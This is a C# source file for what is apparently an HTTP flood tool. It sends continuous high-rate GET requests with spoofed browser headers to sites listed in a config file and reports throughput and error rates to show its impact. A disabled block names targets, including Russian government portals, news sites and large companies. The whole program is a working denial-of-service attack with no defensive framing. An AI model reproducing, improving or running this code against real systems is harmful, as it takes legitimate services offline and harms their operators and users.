using System;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Xml;
using System.Xml.Serialization;

namespace petrom
{
    public class Opts
    {
        public int RequestsPerSite;
        public string Sites;
        public int ReportNumRows;
    }

    class Program
    {
        private static Decoder Decoder = Encoding.UTF8.GetDecoder();
        private Opts _opts;
        private Int64 _totalRx;
        private Int64 _numTotalRequests;
        class RequestState
        {
            public HttpWebRequest Request;
            public byte[] Buffer = new byte[16384];
            public Stream Stream;
            public UrlState UrlState;
        }

        static void Main(string[] args)
        {
            var prog = new Program();
            prog.Run();
        }

        class UrlState
        {
            public string Url;
            public int NumRequestsInFlight;
            public int Rx;
            public int NumErrors;
            public int NumReadErrors;
            public int NumRequests;
            public double Kbps;
            public double AvgKbps;
            public double AvgRps;

            //code stats
            public int Num300Codes;
            public int Num400Codes;
            public int Num500Codes;
        }

        private List<UrlState> _urlStates;

        private string[] _colNames = new string[]
        {
            "Url",
            "Errs",
            "Reqs",
            "Kbps",
            "Kbps(avg)",
            "300/400/500",
            "Rqps"
        };

        private int[] _cols = new int[]
        {
            25,
            10,
            10,
            10,
            10,
            15,
            5
        };

        private StringBuilder _sb = new StringBuilder();
        void PrintFmt(int[] cols, params string[] pars)
        {
            _sb.Clear();
            for (int i = 0; i < Math.Min(cols.Length, pars.Length); ++i)
            {
                var str = pars[i];
                if (str.Length < cols[i])
                {
                    _sb.Append(str);
                    for (int j = str.Length; j < cols[i]; ++j)
                    {
                        _sb.Append(" ");
                    }
                }
                else
                {
                    _sb.Append(str.AsSpan(0, cols[i]));
                }

                _sb.Append(" ");
            }
            Console.WriteLine(_sb.ToString());
        }

        void ReloadOptions()
        {
            string[] newSites;
            using (var fileStream = File.Open("opts.xml", FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
            {
                var serializer = new XmlSerializer(typeof(Opts));
                _opts = (Opts)serializer.Deserialize(fileStream);
                newSites = _opts.Sites.Split('\n').Select(x => x.Trim(' ', '\r', '\t'))
                    .Where(x => x != "")
                    .ToArray();
                _opts.RequestsPerSite = Math.Max(_opts.RequestsPerSite, 1);
                if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                    _opts.RequestsPerSite = 2;//just for testing
            }
            //replace old sites with new sites
            var oldSet = _urlStates.Select(x => x.Url).ToHashSet();
            var newSet = newSites.ToHashSet();

            var newUrlStates = new List<UrlState>();
            foreach (var url in _urlStates)
            {
                if(newSet.Contains(url.Url))
                    newUrlStates.Add(url);
            }

            foreach (var addr in newSites)
            {
                if (!oldSet.Contains(addr))
                    newUrlStates.Add(new UrlState(){Url = addr});
            }

            _urlStates = newUrlStates;
        }

        void Run()
        {
            _opts = new Opts();
            _urlStates = new List<UrlState>();
            ReloadOptions();

            //main loop
            var lastReportTime = new DateTime();
            var lastReloadTime = new DateTime();

            while (true)
            {
                var maxPerTick = 150;
                //TODO: may not spawn enough
                for (int i = 0; i < maxPerTick; ++i)
                {
                    SpawnRequest();
                }

                var now = DateTime.Now;
                if (now >= lastReportTime.AddSeconds(1))
                {
                    PrintStats(now, lastReportTime);
                    lastReportTime = now;
                }

                if (now >= lastReloadTime.AddSeconds(2))
                {
                    ReloadOptions();
                    lastReloadTime = now;
                }

                Thread.Sleep(50);
            }
        }

        private void PrintStats(DateTime now, DateTime lastReportTime)
        {
            Console.Clear();
            Console.WriteLine(now);
            PrintFmt(_cols, _colNames);
            var passed = (now - lastReportTime).TotalSeconds;
            var totalKbps = 0.0;
            var totalRqInSpan = 0;
            foreach (var url in _urlStates)
            {
                var rx = url.Rx;
                _totalRx += rx;
                Interlocked.Add(ref url.Rx, -rx);
                url.Kbps = rx / (passed * 1024);
                var k = 0.1;
                url.AvgKbps = url.AvgKbps * (1 - k) + url.Kbps * k;
                totalKbps += url.AvgKbps;

                var rq = url.NumRequests;
                Interlocked.Add(ref url.NumRequests, -rq);
                totalRqInSpan += rq;
                var rqps = rq / passed;
                url.AvgRps = url.AvgRps * (1 - k) + rqps * k;
            }

            var displayOrder = _urlStates.ToList();
            displayOrder.Sort((x, y) => -x.AvgKbps.CompareTo(y.AvgKbps));

            foreach (var url in displayOrder.GetRange(0, _opts.ReportNumRows))
            {
                PrintFmt(_cols,
                    url.Url,
                    $"{url.NumErrors}/{url.NumReadErrors}",
                    $"{url.NumRequestsInFlight} ({url.NumRequests})",
                    ((int) (url.Kbps)).ToString(),
                    $"{url.AvgKbps:F2}",
                    $"{url.Num300Codes}/{url.Num400Codes}/{url.Num500Codes}",
                    $"{url.AvgRps:F2}"
                );
            }

            Console.WriteLine($"Total kbps: {(int) totalKbps}");
            Console.WriteLine($"Total rx: {_totalRx / (1024 * 1024)} Mb");
            Console.WriteLine($"Requests: {_numTotalRequests} RPS: {totalRqInSpan/passed:F2}");
        }

        void SpawnRequest()
        {
            //select Url
            //what strategy shoud I use?
            //lets start with even reqs in flight per Url
            UrlState urlState = null;

            foreach (var state in _urlStates)
            {
                if (state.NumRequestsInFlight  < _opts.RequestsPerSite)
                {
                    urlState = state;
                    break;
                }
            }

            if (urlState == null)
                return;

            var req = WebRequest.Create(urlState.Url) as HttpWebRequest;
            req.Timeout = 7000;

            req.Headers["accept"] =
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'";
            req.Headers["accept-encoding"] = "gzip, deflate, br";
            req.Headers["accept-language"] = "ru-RU,ru;q=0.9";
            req.Headers["cache-control"] = "max-age=0";
            req.Headers["upgrade-insecure-requests"] = "1";
            req.Headers["user-agent"] =
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36";



            var rs = new RequestState
            {
                Request = req,
                UrlState = urlState
            };

            Interlocked.Increment(ref _numTotalRequests);
            Interlocked.Increment(ref urlState.NumRequests);
            Interlocked.Increment(ref urlState.NumRequestsInFlight);

            req.BeginGetResponse(RespCallback, rs);
        }

        void RespCallback(IAsyncResult ar)
        {
            var state = ar.AsyncState as RequestState;
            HttpWebResponse resp = null;
            try
            {
                resp = state.Request.EndGetResponse(ar) as HttpWebResponse;
            }
            catch (Exception ex)
            {
                Interlocked.Add(ref state.UrlState.NumErrors, 1);
                Interlocked.Decrement(ref state.UrlState.NumRequestsInFlight);
                return;
            }

            var code = (int)resp.StatusCode;
            if (code < 300)
            {
            }
            else if (code < 400)
            {
                Interlocked.Increment(ref state.UrlState.Num300Codes);
            }
            else if (code < 500)
            {
                Interlocked.Increment(ref state.UrlState.Num400Codes);
            }
            else
            {
                Interlocked.Increment(ref state.UrlState.Num500Codes);
            }

            state.Stream = resp.GetResponseStream();
            state.Stream.BeginRead(state.Buffer, 0, state.Buffer.Length, ReadCallback, state);
        }

        void ReadCallback(IAsyncResult ar)
        {
            var state = ar.AsyncState as RequestState;
            int read = 0;
            try
            {
                read = state.Stream.EndRead(ar);
            }
            catch (Exception ex)
            {
                Interlocked.Increment(ref state.UrlState.NumReadErrors);
                Interlocked.Decrement(ref state.UrlState.NumRequestsInFlight);
                state.Request.Abort();
                return;
            }
            
            if (read > 0)
            {
                Interlocked.Add(ref state.UrlState.Rx, read);
                //var buffer = new char[read*2];
                //var len = Decoder.GetChars(state.Buffer, 0, read, buffer, 0);
                //var str = new String(buffer, 0, len);
                //Console.WriteLine(str);
                state.Stream.BeginRead(state.Buffer, 0, state.Buffer.Length, ReadCallback, state);
            }
            else
            {
                Interlocked.Decrement(ref state.UrlState.NumRequestsInFlight);
            }
        }
    }
}

#if false
        private string[] _urls = new[]
        {
            "https://rmk-group.ru/ru",
            "https://lenta.ru",
            "https://www.tmk-group.ru",
            "https://ya.ru",
            "https://www.polymetalinternational.com/ru",
            "https://vesti.ru",
            "https://m.vesti.ru",
            "https://ria.ru",
            "https://mail.rkn.gov.ru",
            "https://cloud.rkn.gov.ru",
            "https://mvd.gov.ru",
            "https://pwd.wto.economy.gov.ru", 
            "https://stroi.gov.ru",
            "https://proverki.gov.ru",
            "https://www.gazprom.ru",
            "https://lukoil.ru",
            "https://magnit.ru",
            "https://www.nornickel.com",
            "https://www.surgutneftegas.ru",
            "https://www.tatneft.ru",
            "https://www.evraz.com/ru",
            "https://nlmk.com",
            "https://www.sibur.ru",
            "https://www.severstal.com",
            "https://www.metalloinvest.com",
            "https://nangs.org",
            "https://www.uralkali.com/ru",
            "https://www.eurosib.ru",
            "https://omk.ru",
        };
#endif
